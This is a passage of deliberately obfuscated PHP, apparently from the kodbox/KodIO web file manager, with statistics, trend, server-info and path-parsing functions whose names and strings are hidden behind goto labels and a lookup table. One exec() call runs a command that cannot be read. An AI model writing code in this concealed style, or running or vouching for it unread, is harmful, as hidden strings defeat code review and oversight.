$_SERVER[¦·]; $FŒ½Ä»†æÅ = $fçœ½ÆéÓÚ; $D—â—Æ‘°Î = strtotime($B¾Ÿƒ£îçã[2046]); $FÜ¦ô¢®¢Ò = array(); while ($FŒ½Ä»†æÅ <= $D—â—Æ‘°Î) { $FÜ¦ô¢®¢Ò[] = date($B¾Ÿƒ£îçã[2045], $FŒ½Ä»†æÅ); $FŒ½Ä»†æÅ = strtotime($B¾Ÿƒ£îçã[2048], $FŒ½Ä»†æÅ); } return $FÜ¦ô¢®¢Ò; } public function _recordUser($B›ˆšñòç = '') { goto Cæ±ÅÉ„Ò; Cæ±ÅÉ„Ò: $A•Ñ¿ËäßÏ =& $_SERVER[¦·]; $bíÁ©¯ ö¯ = strtotime(date($A•Ñ¿ËäßÏ[2049], strtotime($B›ˆšñòç))); $bÕ½¾©©­¸ = strtotime(date($A•Ñ¿ËäßÏ[2050], strtotime($B›ˆšñòç))); goto C¦óÃİ¤ø; bñÈ¡îä¦¾: $eß¼Á¤Åƒ = array($A•Ñ¿ËäßÏ[210] => $B›ˆšñòç, $A•Ñ¿ËäßÏ[701] => (int) $dÖ»Šóª’, $A•Ñ¿ËäßÏ[2038] => (int) $F×‘Á£Áª„, $A•Ñ¿ËäßÏ[2039] => (int) $E¶…„•‹); return $this->insert($eß¼Á¤Åƒ); goto b»„““»”Î; C¦óÃİ¤ø: $a’ñŒ’‡é = array($A•Ñ¿ËäßÏ[187] => array($A•Ñ¿ËäßÏ[929], $bÕ½¾©©­¸)); $dÖ»Šóª’ = Model($A•Ñ¿ËäßÏ[479])->where($a’ñŒ’‡é)->count($A•Ñ¿ËäßÏ[1441]); $a’ñŒ’‡é[$A•Ñ¿ËäßÏ[187]] = array($A•Ñ¿ËäßÏ[321], array($bíÁ©¯ ö¯, $bÕ½¾©©­¸)); goto DÊóÁäëó; DÊóÁäëó: $F×‘Á£Áª„ = Model($A•Ñ¿ËäßÏ[479])->where($a’ñŒ’‡é)->count($A•Ñ¿ËäßÏ[1441]); $a’ñŒ’‡é[$A•Ñ¿ËäßÏ[29]] = $A•Ñ¿ËäßÏ[2051]; $E¶…„•‹ = Model($A•Ñ¿ËäßÏ[2052])->where($a’ñŒ’‡é)->count($A•Ñ¿ËäßÏ[2053]); goto bñÈ¡îä¦¾; b»„““»”Î: } public function _recordStore($dº±ÁÓŒŞî = '') { goto fÖ·÷µÌâ; f“…¥Û…ÛÀ: $a…ÑƒËÇÁò[$e­Æ­¢ÕĞ[371]] = 1; $Dõ×Â†Éë· = Model($e­Æ­¢ÕĞ[753])->where($a…ÑƒËÇÁò)->sum($e­Æ­¢ÕĞ[77]); $a…ÑƒËÇÁò[$e­Æ­¢ÕĞ[371]] = 2; goto EÈæ‘°·¥; fÖ·÷µÌâ: $e­Æ­¢ÕĞ =& $_SERVER[¦·]; $BŠ¬í‹¸©ê = strtotime(date($e­Æ­¢ÕĞ[2050], strtotime($dº±ÁÓŒŞî))); $a…ÑƒËÇÁò = array($e­Æ­¢ÕĞ[187] => array($e­Æ­¢ÕĞ[929], $BŠ¬í‹¸©ê)); goto EÂ¨¿Ô´·; EÈæ‘°·¥: $Cğ¨­ÊÃ = Model($e­Æ­¢ÕĞ[753])->where($a…ÑƒËÇÁò)->sum($e­Æ­¢ÕĞ[77]); $d¥¹±÷½ËŸ = array($e­Æ­¢ÕĞ[210] => $dº±ÁÓŒŞî, $e­Æ­¢ÕĞ[699] => (int) $fµ‰ÑÈñ, $e­Æ­¢ÕĞ[2042] => (int) $D†©­ãğ£ê, $e­Æ­¢ÕĞ[2043] => (int) $Dõ×Â†Éë·, $e­Æ­¢ÕĞ[2044] => (int) $Cğ¨­ÊÃ); return $this->insert($d¥¹±÷½ËŸ); goto Dõùª³”—; EÂ¨¿Ô´·: $D†©­ãğ£ê = Model($e­Æ­¢ÕĞ[422])->where($a…ÑƒËÇÁò)->sum($e­Æ­¢ÕĞ[77]); $a…ÑƒËÇÁò[$e­Æ­¢ÕĞ[370]] = 0; $fµ‰ÑÈñ = Model($e­Æ­¢ÕĞ[753])->where($a…ÑƒËÇÁò)->sum($e­Æ­¢ÕĞ[77]); goto f“…¥Û…ÛÀ; Dõùª³”—: } public function trend($C®®Úº–—, $bÖŠÄ°á‡) { goto EÓµ”êä³Ì; EÓµ”êä³Ì: $D¾öÆöƒÒ† =& $_SERVER[¦·]; if (!$this->init($C®®Úº–—)) { return !1; } $eÃ¹±×¥Ïª = $this->trendList($C®®Úº–—); goto e‰‹¦÷¹„Ş; c¿åÁ¹©ê: if (empty($eÃ¹±×¥Ïª)) { $AÓë¤¯‹‚ = date($D¾öÆöƒÒ†[2045], strtotime($D¾öÆöƒÒ†[2046])); $C¢´Ì·ä¤ä = array($D¾öÆöƒÒ†[210] => $AÓë¤¯‹‚); foreach ($A¶èğÚŒ·Í[$C®®Úº–—] as $dƒ…ƒãë¦ó => $CÎ®Àùç‡Â) { $C¢´Ì·ä¤ä[$dƒ…ƒãë¦ó] = 0; } $eÃ¹±×¥Ïª[] = $C¢´Ì·ä¤ä; } $b­¤„…§µ¨ = array(); foreach ($eÃ¹±×¥Ïª as $CÎ®Àùç‡Â) { if ($C®®Úº–— == $D¾öÆöƒÒ†[2040] && $CÎ®Àùç‡Â[$D¾öÆöƒÒ†[2042]] > $CÎ®Àùç‡Â[$D¾öÆöƒÒ†[699]]) { $CÎ®Àùç‡Â[$D¾öÆöƒÒ†[2042]] = $CÎ®Àùç‡Â[$D¾öÆöƒÒ†[699]]; } foreach ($A¶èğÚŒ·Í[$C®®Úº–—] as $dƒ…ƒãë¦ó => $F¦¹›¼ÌÁ°) { $DÙøĞ÷ˆë‹ = array($D¾öÆöƒÒ†[210] => $CÎ®Àùç‡Â[$D¾öÆöƒÒ†[210]], $D¾öÆöƒÒ†[1347] => $F¦¹›¼ÌÁ°); $DÙøĞ÷ˆë‹[$BÅÅ¦æ‘Ù›[$C®®Úº–—]] = isset($CÎ®Àùç‡Â[$dƒ…ƒãë¦ó]) ? $CÎ®Àùç‡Â[$dƒ…ƒãë¦ó] : 0; $b­¤„…§µ¨[] = $DÙøĞ÷ˆë‹; } } goto a„¼›Ó™á; e‰‹¦÷¹„Ş: if ($eÃ¹±×¥Ïª && $bÖŠÄ°á‡ != $D¾öÆöƒÒ†[1416]) { $fì¹ó“Œ  = $eÃ¹±×¥Ïª[0][$D¾öÆöƒÒ†[210]]; $f…î°‚Ãø = $this->validDate($bÖŠÄ°á‡, $fì¹ó“Œ ); $Aâ¦äÎğ‡ = array(); $d®Š‘è¢ç = array_to_keyvalue($eÃ¹±×¥Ïª, $D¾öÆöƒÒ†[210]); foreach ($f…î°‚Ãø as $AÓë¤¯‹‚) { if (isset($d®Š‘è¢ç[$AÓë¤¯‹‚])) { $DÙøĞ÷ˆë‹ = $d®Š‘è¢ç[$AÓë¤¯‹‚]; } else { $DÙøĞ÷ˆë‹ = end($eÃ¹±×¥Ïª); $DÙøĞ÷ˆë‹[$D¾öÆöƒÒ†[210]] = $AÓë¤¯‹‚; if ($C®®Úº–— == $D¾öÆöƒÒ†[536]) { $DÙøĞ÷ˆë‹[$D¾öÆöƒÒ†[2038]] = $DÙøĞ÷ˆë‹[$D¾öÆöƒÒ†[2039]] = 0; } } $Aâ¦äÎğ‡[] = $DÙøĞ÷ˆë‹; } $eÃ¹±×¥Ïª = $Aâ¦äÎğ‡; } $A¶èğÚŒ·Í = array($D¾öÆöƒÒ†[536] => array($D¾öÆöƒÒ†[701] => LNG($D¾öÆöƒÒ†[2054]), $D¾öÆöƒÒ†[2038] => LNG($D¾öÆöƒÒ†[2055]), $D¾öÆöƒÒ†[2039] => LNG($D¾öÆöƒÒ†[2056])), $D¾öÆöƒÒ†[2040] => array($D¾öÆöƒÒ†[699] => LNG($D¾öÆöƒÒ†[2057]), $D¾öÆöƒÒ†[2042] => LNG($D¾öÆöƒÒ†[2058]), $D¾öÆöƒÒ†[2043] => LNG($D¾öÆöƒÒ†[2059]), $D¾öÆöƒÒ†[2044] => LNG($D¾öÆöƒÒ†[2060]))); $BÅÅ¦æ‘Ù› = array($D¾öÆöƒÒ†[536] => $D¾öÆöƒÒ†[2061], $D¾öÆöƒÒ†[2040] => $D¾öÆöƒÒ†[77]); goto c¿åÁ¹©ê; a„¼›Ó™á: return $b­¤„…§µ¨; goto Eˆø·‘›ƒ„; Eˆø·‘›ƒ„: } public function validDate($F¦ÊàÅ¶ÃŞ, $b¨æÒ¢òÇÚ) { goto f°³Œ•§Ñ; B»Ë‡º“ÈŸ: switch ($F¦ÊàÅ¶ÃŞ) { case $A˜¼ãî»È·[1423]: $d³ÈŞêçğ = mktime(0, 0, 0, date($A˜¼ãî»È·[2062]), date($A˜¼ãî»È·[2063]) - date($A˜¼ãî»È·[1230]) + 7 - 7, date($A˜¼ãî»È·[2064])); $E¸çñ»Øíê = 0; do { $b”‹Úµâº = date($A˜¼ãî»È·[2045], $d³ÈŞêçğ - 3600 * 24 * 7 * $E¸çñ»Øíê); $c¯Â¯çŒ¬“[] = $b”‹Úµâº; $E¸çñ»Øíê++; } while ($b¨æÒ¢òÇÚ < $b”‹Úµâº); break; case $A˜¼ãî»È·[1421]: $E¸çñ»Øíê = 1; do { $Dø¦ÃÍ·Ü® = date($A˜¼ãî»È·[2065], strtotime("\55\40{$E¸çñ»Øíê}\40\155\x6f\156\164\150\x73")); $c¯Â¯çŒ¬“[] = $Dø¦ÃÍ·Ü®; $E¸çñ»Øíê++; } while ($b¨æÒ¢òÇÚ < $Dø¦ÃÍ·Ü®); break; case $A˜¼ãî»È·[1730]: $DÕ’¿»§óÇ = (int) date($A˜¼ãî»È·[2064], strtotime($b¨æÒ¢òÇÚ)); $fÇ¬à¬ïİ¢ = (int) date($A˜¼ãî»È·[2064]); if ($DÕ’¿»§óÇ >= $fÇ¬à¬ïİ¢) { break; } for ($DÕ’¿»§óÇ; $DÕ’¿»§óÇ < $fÇ¬à¬ïİ¢; $DÕ’¿»§óÇ++) { $c¯Â¯çŒ¬“[] = $DÕ’¿»§óÇ . $A˜¼ãî»È·[2066]; } break; default: break; } if ($b¨æÒ¢òÇÚ > end($c¯Â¯çŒ¬“)) { array_pop($c¯Â¯çŒ¬“); } sort($c¯Â¯çŒ¬“); goto c¯æ›å­İ; c¯æ›å­İ: return $c¯Â¯çŒ¬“; goto b¼“ù½¶Ğ»; f°³Œ•§Ñ: $A˜¼ãî»È· =& $_SERVER[¦·]; $DŸ¬†Ê¹©› = date($A˜¼ãî»È·[2045], strtotime($A˜¼ãî»È·[2046])); $c¯Â¯çŒ¬“ = array($DŸ¬†Ê¹©›); goto B»Ë‡º“ÈŸ; b¼“ù½¶Ğ»: } public function listTable($e³Üßäº ) { $AÍ»³±İñ‘ = ucfirst($e³Üßäº ); return Model($AÍ»³±İñ‘)->listData(); } public function option($bèêĞº¢‡) { $BÃÉÄç×‚È = $_SERVER[¦·][2067] . ucfirst($bèêĞº¢‡); return $this->{$BÃÉÄç×‚È}(); } private function optionUser() { goto B‹˜ôóà; B‹˜ôóà: $CÚ ËŒŸäã =& $_SERVER[¦·]; $FÚõ¿—÷ = Model($CÚ ËŒŸäã[479])->count($CÚ ËŒŸäã[1441]); $F‹Ã¾ç÷Ñî = Model($CÚ ËŒŸäã[479])->where($CÚ ËŒŸäã[2068])->count($CÚ ËŒŸäã[1441]); goto A§¥’‰÷‹½; a¤å—÷·Ÿ„: $aî»ÄºÀÁ = Model($CÚ ËŒŸäã[479])->where($CÅš‘ÕÈŒÚ)->count($CÚ ËŒŸäã[1441]); return array($CÚ ËŒŸäã[696] => (int) $FÚõ¿—÷, $CÚ ËŒŸäã[2071] => (int) ($FÚõ¿—÷ - $F‹Ã¾ç÷Ñî), $CÚ ËŒŸäã[2072] => (int) $F‹Ã¾ç÷Ñî, $CÚ ËŒŸäã[2073] => (int) $aî»ÄºÀÁ, $CÚ ËŒŸäã[2074] => $bÌ±Šò½°); goto BĞŠõÂºçë; fÜØê©ÅÓç: if (!$bÌ±Šò½°) { $bÌ±Šò½° = 1; } $dİ‚‹åÅï‡ = strtotime(date($CÚ ËŒŸäã[2049])); $CÅš‘ÕÈŒÚ = array($CÚ ËŒŸäã[2070] => array($CÚ ËŒŸäã[930], $dİ‚‹åÅï‡)); goto a¤å—÷·Ÿ„; A§¥’‰÷‹½: $dİ‚‹åÅï‡ = strtotime($CÚ ËŒŸäã[2069]); $CÅš‘ÕÈŒÚ = array($CÚ ËŒŸäã[2070] => array($CÚ ËŒŸäã[930], $dİ‚‹åÅï‡)); $bÌ±Šò½° = (int) Model($CÚ ËŒŸäã[479])->where($CÅš‘ÕÈŒÚ)->count($CÚ ËŒŸäã[1441]); goto fÜØê©ÅÓç; BĞŠõÂºçë: } private function optionFile() { goto A»áÒôö¼Õ; FÛğ¹èƒ: $cÒËæ¦Äáê = Model($DÆ‰µš‘ÃĞ[753])->where($aóÎœàÃ±›)->sum($DÆ‰µš‘ÃĞ[77]); $dïÖÑĞô§½ = Model($DÆ‰µš‘ÃĞ[753])->where($aóÎœàÃ±›)->count($DÆ‰µš‘ÃĞ[369]); return array($DÆ‰µš‘ÃĞ[699] => $fŠã×‚»Ê, $DÆ‰µš‘ÃĞ[2042] => $E»Ô¥ŸÆ”, $DÆ‰µš‘ÃĞ[2075] => $fŠã×‚»Ê - $E»Ô¥ŸÆ”, $DÆ‰µš‘ÃĞ[2076] => (int) $cÒËæ¦Äáê, $DÆ‰µš‘ÃĞ[701] => (int) $FÎò˜Ş¤¯, $DÆ‰µš‘ÃĞ[2077] => (int) $dïÖÑĞô§½); goto f‚„¥ìºÑ; A»áÒôö¼Õ: $DÆ‰µš‘ÃĞ =& $_SERVER[¦·]; $FÑë‚ìë­ = $this->sourceSize(); $fŠã×‚»Ê = $FÑë‚ìë­[$DÆ‰µš‘ÃĞ[77]]; goto BŸµ«Ü¬ßñ; BŸµ«Ü¬ßñ: $E»Ô¥ŸÆ” = $FÑë‚ìë­[$DÆ‰µš‘ÃĞ[2042]]; $FÎò˜Ş¤¯ = Model($DÆ‰µš‘ÃĞ[753])->where(array($DÆ‰µš‘ÃĞ[370] => 0))->count($DÆ‰µš‘ÃĞ[369]); $aóÎœàÃ±› = array($DÆ‰µš‘ÃĞ[370] => 0, $DÆ‰µš‘ÃĞ[187] => array($DÆ‰µš‘ÃĞ[930], strtotime(date($DÆ‰µš‘ÃĞ[2049])))); goto FÛğ¹èƒ; f‚„¥ìºÑ: } private function optionAccess() { $a¤É£Ş†ö° =& $_SERVER[¦·]; return array($a¤É£Ş†ö°[696] => $this->typeLogCnt(), $a¤É£Ş†ö°[103] => $this->typeLogCnt($a¤É£Ş†ö°[103]), $a¤É£Ş†ö°[404] => $this->typeLogCnt($a¤É£Ş†ö°[404]), $a¤É£Ş†ö°[2078] => $this->typeLogCnt($a¤É£Ş†ö°[2078]), $a¤É£Ş†ö°[2079] => $this->typeLogCnt($a¤É£Ş†ö°[2079]), $a¤É£Ş†ö°[536] => $this->typeLogCnt($a¤É£Ş†ö°[33], $a¤É£Ş†ö°[2053])); } private function typeLogCnt($BãÁíËÊã³ = '', $B­ñ±ÄÖĞ¿ = "\151\x64") { goto E«–Œ»ä¹; eÓØÙâØËï: return (int) $d§áº‚Ã; goto FÀÂ“ŞÖ«¡; E«–Œ»ä¹: $AÖãİ‡†¹İ =& $_SERVER[¦·]; $AÄ©­ÀÅÍ = array($AÖãİ‡†¹İ[103] => array($AÖãİ‡†¹İ[2080], $AÖãİ‡†¹İ[2081]), $AÖãİ‡†¹İ[404] => array($AÖãİ‡†¹İ[2082], $AÖãİ‡†¹İ[2083]), $AÖãİ‡†¹İ[2078] => array($AÖãİ‡†¹İ[2084], $AÖãİ‡†¹İ[2085], $AÖãİ‡†¹İ[2086]), $AÖãİ‡†¹İ[2079] => array($AÖãİ‡†¹İ[2087], $AÖãİ‡†¹İ[2088]), $AÖãİ‡†¹İ[2089] => array($AÖãİ‡†¹İ[2090], $AÖãİ‡†¹İ[2091], $AÖãİ‡†¹İ[2092])); $dÖÇÌ®‘Ú = strtotime(date($AÖãİ‡†¹İ[2049])); goto e¹Ğßƒ¤í; e¹Ğßƒ¤í: $FÃŞ„˜Ÿ = array($AÖãİ‡†¹İ[187] => array($AÖãİ‡†¹İ[930], $dÖÇÌ®‘Ú)); if ($BãÁíËÊã³) { $FÃŞ„˜Ÿ[$AÖãİ‡†¹İ[29]] = array($AÖãİ‡†¹İ[7], $AÄ©­ÀÅÍ[$BãÁíËÊã³]); } $d§áº‚Ã = Model($AÖãİ‡†¹İ[2052])->where($FÃŞ„˜Ÿ)->count($B­ñ±ÄÖĞ¿); goto eÓØÙâØËï; FÀÂ“ŞÖ«¡: } private function optionServer() { goto c»ªõŠî¶»; aìß½—…Ù˜: $a‹¯£’ïõ = $E­ÕàìÃµ[0]; $aĞç‘™Í†Ø = $GLOBALS[$b¢ğŞÃÕéÖ[6]][$b¢ğŞÃÕéÖ[17]]; $cªÄ«”ôßÙ = $aĞç‘™Í†Ø[$b¢ğŞÃÕéÖ[890]]; goto b‹—×Ç†; c·ìË‘ÎÜ¤: $A‡„µöÑ¾› = array($b¢ğŞÃÕéÖ[744] => $C»äÆ¬çïÜ[$b¢ğŞÃÕéÖ[367]]); $E‡ÜÖ›ËÁ = Model($b¢ğŞÃÕéÖ[422])->where($A‡„µöÑ¾›)->sum($b¢ğŞÃÕéÖ[77]); $E­ÕàìÃµ = explode($b¢ğŞÃÕéÖ[50], $_SERVER[$b¢ğŞÃÕéÖ[139]]); goto aìß½—…Ù˜; c»ªõŠî¶»: $b¢ğŞÃÕéÖ =& $_SERVER[¦·]; $a¤‚ÙÑ½éÀ = $this->diskDriver(); $C»äÆ¬çïÜ = KodIO::defaultDriver(); goto c·ìË‘ÎÜ¤; b‹—×Ç†: if ($cªÄ«”ôßÙ == $b¢ğŞÃÕéÖ[724]) { $CˆáÕÀĞÊ° = explode($b¢ğŞÃÕéÖ[1079], $aĞç‘™Í†Ø[$b¢ğŞÃÕéÖ[889]]); $cªÄ«”ôßÙ = $CˆáÕÀĞÊ°[0]; } if ($cªÄ«”ôßÙ == $b¢ğŞÃÕéÖ[727] || $cªÄ«”ôßÙ == $b¢ğŞÃÕéÖ[728]) { $eÉ×‡‚šĞ = Model()->db()->query($b¢ğŞÃÕéÖ[2093]); $B×İÇ†ª¸ = $eÉ×‡‚šĞ[0] && isset($eÉ×‡‚šĞ[0][$b¢ğŞÃÕéÖ[1346]]) ? $eÉ×‡‚šĞ[0][$b¢ğŞÃÕéÖ[1346]] : 0; $cªÄ«”ôßÙ = $b¢ğŞÃÕéÖ[2094] . ($B×İÇ†ª¸ ? $b¢ğŞÃÕéÖ[8] . $B×İÇ†ª¸ : $b¢ğŞÃÕéÖ[33]); } $BÉ‡¡¶©±ó = $GLOBALS[$b¢ğŞÃÕéÖ[6]][$b¢ğŞÃÕéÖ[337]][$b¢ğŞÃÕéÖ[755]]; goto Døêˆœ¸; Døêˆœ¸: return array($b¢ğŞÃÕéÖ[2095] => $a¤‚ÙÑ½éÀ ? $a¤‚ÙÑ½éÀ[$b¢ğŞÃÕéÖ[2096]] : 0, $b¢ğŞÃÕéÖ[2097] => $a¤‚ÙÑ½éÀ ? $a¤‚ÙÑ½éÀ[$b¢ğŞÃÕéÖ[2098]] : 0, $b¢ğŞÃÕéÖ[2099] => (int) $C»äÆ¬çïÜ[$b¢ğŞÃÕéÖ[2096]] * 1024 * 1024 * 1024, $b¢ğŞÃÕéÖ[2100] => (int) $E‡ÜÖ›ËÁ, $b¢ğŞÃÕéÖ[2101] => ucfirst($a‹¯£’ïõ), $b¢ğŞÃÕéÖ[2102] => $b¢ğŞÃÕéÖ[2103] . PHP_VERSION, $b¢ğŞÃÕéÖ[2104] => phpBuild64() ? 64 : 32, $b¢ğŞÃÕéÖ[695] => str_replace($b¢ğŞÃÕéÖ[2105], $b¢ğŞÃÕéÖ[906], $cªÄ«”ôßÙ), $b¢ğŞÃÕéÖ[337] => ucfirst($BÉ‡¡¶©±ó), $b¢ğŞÃÕéÖ[28] => $_SERVER[$b¢ğŞÃÕéÖ[2106]]); goto BïÉê; BïÉê: } private function diskDriver() { goto e¢Â¾º¯†; d‰«Ö­òä: if ($f”››‹§‡’) { $aŒÇÚÙ˜Î× = $CÎƒ„èù§[2109]; if (function_exists($CÎƒ„èù§[2110])) { exec($CÎƒ„èù§[2111], $e‹á„¤ê¼‹); $aŒÇÚÙ˜Î× = $e‹á„¤ê¼‹[1] . $CÎƒ„èù§[8]; } } if (!file_exists($aŒÇÚÙ˜Î×)) { return; } $BÌ‘ƒ„êï‡ = @disk_total_space($aŒÇÚÙ˜Î×); goto aõÑÊ›¿Í; aõÑÊ›¿Í: $E±ˆáŒáÌ” = $BÌ‘ƒ„êï‡ - @disk_free_space($aŒÇÚÙ˜Î×); return array($CÎƒ„èù§[2096] => $BÌ‘ƒ„êï‡, $CÎƒ„èù§[2098] => $E±ˆáŒáÌ”); goto CöÑğ‹ªˆ¶; e¢Â¾º¯†: $CÎƒ„èù§ =& $_SERVER[¦·]; $aŒÇÚÙ˜Î× = $CÎƒ„èù§[8]; $f”››‹§‡’ = $GLOBALS[$CÎƒ„èù§[6]][$CÎƒ„èù§[2107]] == $CÎƒ„èù§[2108]; goto d‰«Ö­òä; CöÑğ‹ªˆ¶: } public function fileChart($AÖÛ¬»È¬×) { goto c´ï¹ìƒŠ; c´ï¹ìƒŠ: $aÍå‘èàÔ£ =& $_SERVER[¦·]; if (isset($AÖÛ¬»È¬×[$aÍå‘èàÔ£[1441]])) { return Model($aÍå‘èàÔ£[753])->userFileTypeProfile($AÖÛ¬»È¬×[$aÍå‘èàÔ£[1441]]); } if (isset($AÖÛ¬»È¬×[$aÍå‘èàÔ£[2112]])) { return Model($aÍå‘èàÔ£[753])->groupFileTypeProfile($AÖÛ¬»È¬×[$aÍå‘èàÔ£[2112]]); } goto E¥ì£Ù„¤; E¥ì£Ù„¤: $fáñ¹ã¨… = $this->sourceSize(); $cë¾¾ÁÛÑÀ = array($aÍå‘èàÔ£[463] => 0, $aÍå‘èàÔ£[371] => 1); $eàß—´‘õõ = Model($aÍå‘èàÔ£[753])->where($cë¾¾ÁÛÑÀ)->sum($aÍå‘èàÔ£[77]); goto Aæ©ŠõÓ‘Ş; Aæ©ŠõÓ‘Ş: $cë¾¾ÁÛÑÀ[$aÍå‘èàÔ£[371]] = 2; $DÖÊÓº¦» = Model($aÍå‘èàÔ£[753])->where($cë¾¾ÁÛÑÀ)->sum($aÍå‘èàÔ£[77]); return array($aÍå‘èàÔ£[699] => $fáñ¹ã¨…[$aÍå‘èàÔ£[77]], $aÍå‘èàÔ£[2042] => $fáñ¹ã¨…[$aÍå‘èàÔ£[2042]], $aÍå‘èàÔ£[2043] => (int) $eàß—´‘õõ, $aÍå‘èàÔ£[2044] => (int) $DÖÊÓº¦»); goto BÖº™Ø ô; BÖº™Ø ô: } private function sourceSize() { $aœÁ¹ËÍè— =& $_SERVER[¦·]; $Câ§…òÆÕÅ = Model($aœÁ¹ËÍè—[753])->where(array($aœÁ¹ËÍè—[370] => 0))->sum($aœÁ¹ËÍè—[77]); $C¹ÓËÜ® ¯ = Model($aœÁ¹ËÍè—[422])->sum($aœÁ¹ËÍè—[77]); if ($C¹ÓËÜ® ¯ > $Câ§…òÆÕÅ) { $C¹ÓËÜ® ¯ = $Câ§…òÆÕÅ; } return array($aœÁ¹ËÍè—[77] => (int) $Câ§…òÆÕÅ, $aœÁ¹ËÍè—[2042] => (int) $C¹ÓËÜ® ¯); } } goto a†•œ–õêø; D±•ˆËØÁŸ: define($_SERVER[¦·][1940], 2); define($_SERVER[¦·][1941], 3); define($_SERVER[¦·][1942], 4); goto FºÛÑî³; b¤’‘÷ô¡: class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\163\x65\162\x52\145\143\171\x63\154\145\175"; const KOD_USER_FAV = "\173\x75\163\145\162\106\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\162\x46\151\x6c\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\162\106\151\x6c\145\124\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\x75\160\122\157\157\164\123\145\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\123\x68\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\123\150\141\162\x65\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\x72\145\x54\157\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\162\145\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\162\x65\x49\164\x65\155\114\151\x6e\x6b\x7d"; const KOD_SEARCH = "\173\x73\x65\x61\x72\143\x68\175"; const KOD_BLOCK = "\173\142\x6c\x6f\143\x6b\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\173\x75\163\145\162\x52\x65\x6e\x63\145\156\164\x7d"; const KOD_USER_DRIVER = "\173\144\162\x69\166\x65\x72\175"; public static function typeList() { $F˜ØÑƒƒ™ =& $_SERVER[¦·]; return array($F˜ØÑƒƒ™[1053] => self::KOD_SOURCE, $F˜ØÑƒƒ™[1054] => self::KOD_USER_RECYCLE, $F˜ØÑƒƒ™[1055] => self::KOD_USER_FAV, $F˜ØÑƒƒ™[1056] => self::KOD_USER_FILE_TAG, $F˜ØÑƒƒ™[1057] => self::KOD_USER_FILE_TYPE, $F˜ØÑƒƒ™[1058] => self::KOD_GROUP_ROOT_SELF, $F˜ØÑƒƒ™[1059] => self::KOD_USER_SHARE, $F˜ØÑƒƒ™[1060] => self::KOD_USER_SHARE_LINK, $F˜ØÑƒƒ™[1061] => self::KOD_USER_SHARE_TO_ME, $F˜ØÑƒƒ™[1062] => self::KOD_SHARE_ITEM, $F˜ØÑƒƒ™[1063] => self::KOD_SHARE_LINK, $F˜ØÑƒƒ™[1064] => self::KOD_SEARCH, $F˜ØÑƒƒ™[1065] => self::KOD_BLOCK, $F˜ØÑƒƒ™[1066] => self::KOD_IO, $F˜ØÑƒƒ™[1067] => self::KOD_USER_RECENT, $F˜ØÑƒƒ™[1068] => self::KOD_USER_DRIVER); } public static function parse($Eèˆ±áÜ«) { goto c²ÂÏêò÷Â; DÂµÑƒµ†: preg_match($EÈà“ì©æ¬[1069], $Eèˆ±áÜ«, $cÒŒä‹åĞƒ); $DÑ‘Œ®„ = array($EÈà“ì©æ¬[388] => !1, $EÈà“ì©æ¬[1070] => !1, $EÈà“ì©æ¬[385] => !1, $EÈà“ì©æ¬[75] => $Eèˆ±áÜ«, $EÈà“ì©æ¬[1016] => !1, $EÈà“ì©æ¬[1015] => $EÈà“ì©æ¬[33]); if (is_array($cÒŒä‹åĞƒ) && count($cÒŒä‹åĞƒ) == 5) { $Fˆë‚Åô‘È = $EÈà“ì©æ¬[1071] . $cÒŒä‹åĞƒ[2] . $EÈà“ì©æ¬[315]; if (in_array($Fˆë‚Åô‘È, $F™…¹’Å×ç)) { $DÑ‘Œ®„[$EÈà“ì©æ¬[1016]] = $cÒŒä‹åĞƒ[1]; $DÑ‘Œ®„[$EÈà“ì©æ¬[29]] = $Fˆë‚Åô‘È; $DÑ‘Œ®„[$EÈà“ì©æ¬[1072]] = substr($Fˆë‚Åô‘È, 1, -1); $DÑ‘Œ®„[$EÈà“ì©æ¬[367]] = $cÒŒä‹åĞƒ[3]; } $DÑ‘Œ®„[$EÈà“ì©æ¬[1015]] = $cÒŒä‹åĞƒ[4]; } goto eÃÒŞÀƒ‡ƒ; eÃÒŞÀƒ‡ƒ: $D²óÁÇº‡ = array($EÈà“ì©æ¬[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $DÑ‘Œ®„[$EÈà“ì©æ¬[1073]] = in_array($DÑ‘Œ®„[$EÈà“ì©æ¬[29]], $D²óÁÇº‡); return $DÑ‘Œ®„; goto DÒæíàø™¹; c²ÂÏêò÷Â: $EÈà“ì©æ¬ =& $_SERVER[¦·]; $Eèˆ±áÜ« = self::clear($Eèˆ±áÜ«); $F™…¹’Å×ç = array_values(self::typeList()); goto DÂµÑƒµ†; DÒæíàø™¹: } public static function clear($D‰Ó‡†¬±) { goto aŞÔ”’‡Ïï; bĞÁèÍ”™à: $D‰Ó‡†¬± = preg_replace($eƒ¬œ†×ĞÆ[1076], $eƒ¬œ†×ĞÆ[8], $D‰Ó‡†¬±); if ($D‰Ó‡†¬± == $eƒ¬œ†×ĞÆ[8]) { return $eƒ¬œ†×ĞÆ[8]; } $D‰Ó‡†¬± = rtrim($D‰Ó‡†¬±, $eƒ¬œ†×ĞÆ[8]); goto Aà—ÈòÚ; aŞÔ”’‡Ïï: $eƒ¬œ†×ĞÆ =& $_SERVER[¦·]; $D‰Ó‡†¬± = str_replace(array($eƒ¬œ†×ĞÆ[995], $eƒ¬œ†×ĞÆ[217]), $eƒ¬œ†×ĞÆ[50], $D‰Ó‡†¬±); $D‰Ó‡†¬± = str_replace($eƒ¬œ†×ĞÆ[93], $eƒ¬œ†×ĞÆ[8], $D‰Ó‡†¬±); goto Cï„»î»°ã; Aà—ÈòÚ: return $D‰Ó‡†¬±; goto c®ËÕŞã¾; Cï„»î»°ã: $d£İ¹‚ƒ‡Ê = $eƒ¬œ†×ĞÆ[1074]; if (substr($D‰Ó‡†¬±, 0, 3) == $eƒ¬œ†×ĞÆ[1075]) { $D‰Ó‡†¬± = substr($D‰Ó‡†¬±, 3); 